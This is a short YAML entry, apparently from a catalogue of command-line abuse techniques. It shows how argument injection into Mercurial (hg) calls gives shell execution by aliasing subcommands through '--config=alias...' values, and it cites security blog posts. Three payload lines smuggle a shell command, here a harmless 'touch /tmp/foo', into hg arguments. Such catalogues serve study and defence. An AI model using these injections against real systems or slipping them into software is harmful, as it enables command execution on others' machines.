---
functions:
  command:
    - description: There's a generic way to exploit argument injection vulnerabilities with Mercurial by aliasing built-in subcommands to shell scripts.
      code: |
        hg cat '--config=alias.cat="!touch /tmp/foo"'
        hg log '--config=alias.log="!touch /tmp/foo"'
        hg clone '--config=alias.clone="!touch /tmp/foo"'
      references:
        - title: "Securing Developer Tools: A New Supply Chain Attack on PHP"
          url: https://www.sonarsource.com/blog/securing-developer-tools-a-new-supply-chain-attack-on-php/
        - title: PHP Supply Chain Attack on Composer
          url: https://www.sonarsource.com/blog/php-supply-chain-attack-on-composer/
        - title: Rediscovering argument injection when using VCS tools — git and mercurial
          url: https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/
---
